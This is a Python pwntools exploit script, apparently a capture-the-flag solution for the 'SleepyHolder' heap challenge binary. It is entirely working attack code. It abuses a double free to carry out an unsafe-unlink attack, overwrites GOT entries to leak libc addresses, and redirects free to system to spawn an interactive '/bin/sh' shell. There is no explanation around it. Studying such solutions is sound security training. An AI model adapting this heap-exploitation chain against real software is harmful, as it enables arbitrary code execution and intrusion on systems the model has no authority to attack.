#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'

def add(choice, secret):
    p.sendlineafter(b'Renew secret', str(1))
    p.sendlineafter(b'Big secret', str(choice))
    p.sendlineafter(b'secret: ', secret)

def delete(choice):
    p.sendlineafter(b'Renew secret', str(2))
    p.sendlineafter(b'Big secret', str(choice))

def update(choice, secret, line=True):
    p.sendlineafter(b'Renew secret', str(3))
    p.sendlineafter(b'Big secret', str(choice))
    if line == True:
        p.sendlineafter(b'secret: ', secret)
    else:
        p.sendafter(b'secret: ', secret)

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF('./SleepyHolder')
p = process('./SleepyHolder')

add(1, b'aaaa')
add(2, b'bbbb')
delete(1)
add(3, b'cccc')
delete(1)

# unlink
FD = 0x6020d0 - 0x18
BK = 0x6020d0 - 0x10
payload = flat(
        0, 0x21,
        FD, BK,
        0x20)
add(1, payload)
delete(2)

# rewrite:
#   s_ptr to 0x6020b8
#   f_ptr to elf.got['free']
payload = flat(
        0, 0x6020b8,
        0, elf.got['free'])
update(1, payload)

# rewrite:
#   elf.got['free'] to elf.plt['puts']
payload = p64(elf.plt['puts'])
update(1, payload, line=False)

# rewrite:
#   f_ptr to elf.got['puts']
payload = flat(
        0, 0x6020b8,
        0, elf.got['puts'])
update(2, payload)

# leak libc
delete(1)
libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\0')) - libc.symbols['puts']
log.info('libc: {:#x}'.format(libc.address))

# rewrite:
#   s_ptr to 0x6020d0
#   f_ptr to 0x6020b8
payload = flat(
        0, 0x6020d0,
        0, 0x6020b8)
update(2, payload)

# rewrite:
#   f_flag = 1
payload = flat(
        0x6020b8, 1,
        1, 1)
update(2, payload)

# rewrite:
#   s_ptr to '/bin/sh'@libc
#   f_ptr to elf.got['free']
payload = flat(
        0, next(libc.search(b'/bin/sh\0')),
        0, elf.got['free'])
update(1, payload)

# rewrite:
#   elf.got['free'] to system@libc
payload = p64(libc.symbols['system'])
update(1, payload, line=False)

# invoke system('/bin/sh')
delete(2)

p.interactive()
